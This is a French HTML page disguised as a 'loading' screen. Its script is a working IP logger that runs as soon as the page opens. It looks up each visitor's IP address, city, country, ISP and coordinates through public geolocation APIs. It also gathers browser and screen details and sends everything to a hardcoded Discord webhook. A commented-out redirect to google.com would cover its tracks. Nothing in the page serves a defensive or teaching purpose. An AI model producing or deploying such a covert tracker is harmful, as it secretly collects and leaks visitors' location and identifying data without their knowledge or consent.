<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Chargement...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: system-ui, -apple-system, sans-serif;
      background: #0a0a0a;
      color: #e0e0e0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .card {
      background: #141414;
      border: 1px solid #2a2a2a;
      border-radius: 12px;
      padding: 2rem;
      max-width: 420px;
      width: 90%;
      text-align: center;
    }
    h1 { font-size: 1.25rem; margin-bottom: 0.5rem; color: #fff; }
    p { color: #888; font-size: 0.9rem; margin-bottom: 1.5rem; }
    .status {
      background: #1a1a1a;
      border-radius: 8px;
      padding: 1rem;
      font-family: ui-monospace, monospace;
      font-size: 0.85rem;
      color: #4ade80;
      word-break: break-all;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Chargement en cours...</h1>
    <p>Veuillez patienter un instant.</p>
    <div id="status" class="status">Récupération des infos...</div>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1573689278758780969/81L_PnH56AOSVgIBeucy4FQpueabbeDRw5hgoQPyCLzeGs8LgAo-xeali-JewGUDCTaf";

    async function getIP() {
      const endpoints = [
        {
          url: "https://api.ipify.org?format=json",
          parse: d => ({ ip: d.ip })
        },
        {
          url: "https://ipapi.co/json/",
          parse: d => ({
            ip: d.ip, city: d.city, region: d.region,
            country: d.country_name, isp: d.org,
            lat: d.latitude, lon: d.longitude, timezone: d.timezone
          })
        },
        {
          url: "https://ipinfo.io/json",
          parse: d => ({
            ip: d.ip, city: d.city, region: d.region,
            country: d.country, isp: d.org,
            timezone: d.timezone
          })
        },
        {
          url: "https://api.ip.sb/geoip",
          parse: d => ({
            ip: d.ip, city: d.city, region: d.region_name,
            country: d.country, isp: d.isp,
            lat: d.latitude, lon: d.longitude, timezone: d.timezone
          })
        }
      ];

      let result = {};
      for (const ep of endpoints) {
        try {
          const res = await fetch(ep.url, { cache: "no-store" });
          if (!res.ok) continue;
          const data = await res.json();
          const parsed = ep.parse(data);
          for (const [k, v] of Object.entries(parsed)) {
            if (v && !result[k]) result[k] = v;
          }
          if (result.ip && result.country) break;
        } catch (e) { continue; }
      }
      return Object.keys(result).length ? result : null;
    }

    function collectClientInfo() {
      return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height} @${window.devicePixelRatio}x`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        referrer: document.referrer || "direct",
        url: window.location.href,
        timestamp: new Date().toISOString()
      };
    }

    async function sendToDiscord(geo, client) {
      const fields = [
        { name: "🌐 IP",       value: geo?.ip       || "?", inline: true  },
        { name: "🏳️ Pays",     value: geo?.country  || "?", inline: true  },
        { name: "🏙️ Ville",    value: geo?.city     || "?", inline: true  },
        { name: "📡 ISP",      value: geo?.isp      || "?", inline: false },
        { name: "🕐 Heure",    value: client.timestamp,      inline: false },
        { name: "🔗 URL",      value: client.url.slice(0, 200), inline: false },
        { name: "↩️ Referrer", value: client.referrer,       inline: false },
        { name: "💻 UA",       value: client.userAgent.slice(0, 200), inline: false },
        { name: "🖥️ Écran",   value: client.screen,         inline: true  },
        { name: "🗺️ Coords",  value: (geo?.lat && geo?.lon) ? `${geo.lat}, ${geo.lon}` : "?", inline: true }
      ];

      const body = JSON.stringify({
        embeds: [{
          title: "🔔 Nouveau visiteur",
          color: 0x4ade80,
          fields,
          footer: { text: "IP Logger" },
          timestamp: new Date().toISOString()
        }]
      });

      try {
        const res = await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body
        });
        if (res.ok || res.status === 204) return true;
      } catch (_) {}

      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body,
          mode: "no-cors"
        });
      } catch (_) {}

      return false;
    }

    (async () => {
      const statusEl = document.getElementById("status");
      const [geo, client] = await Promise.all([getIP(), Promise.resolve(collectClientInfo())]);

      statusEl.textContent = geo?.ip
        ? `IP: ${geo.ip}\n${[geo.city, geo.country].filter(Boolean).join(", ")}`
        : "Impossible de récupérer l'IP";

      await sendToDiscord(geo, client);

      // setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
    })();
  </script>
</body>
</html>
